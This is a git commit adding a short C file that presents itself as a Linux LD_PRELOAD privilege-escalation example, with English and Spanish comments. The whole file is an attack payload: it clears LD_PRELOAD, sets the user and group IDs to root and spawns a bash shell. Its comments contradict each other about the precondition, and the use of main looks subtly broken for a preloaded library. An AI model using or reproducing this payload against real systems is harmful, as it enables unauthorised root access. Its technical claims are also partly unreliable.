f3d6e7c34917919a5d9ce8f1954b243106853c76
Gaspar <52015401+G4sp4rCS@users.noreply.github.com>
2025-02-14 16:42:29 -0300

    upload

---
+++ ld-preload-priv-esc-linux.c
@@ -0,0 +1,15 @@
+// This program is a simple example of a Linux LD_PRELOAD privilege escalation.
+// LD_PRELOAD is an environment variable that allows you to load a shared object file before any other library (including the C runtime library) when a program is run. This can be used to override functions in the C runtime library, such as the `getuid` function, to escalate privileges.
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+// Este programa unicamente funciona si el usuario que lo ejecuta tiene permisos de escritura en /etc/ld.so.preload, para chequear esto se puede ejecutar el siguiente comando:
+// ls -la /etc/ld.so.preload
+// y el output tiene que ser algo como lo siguiente: -rw-r--r-- 1 root root 0 mar  1  2021 /etc/ld.so.preload
+void main(){
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
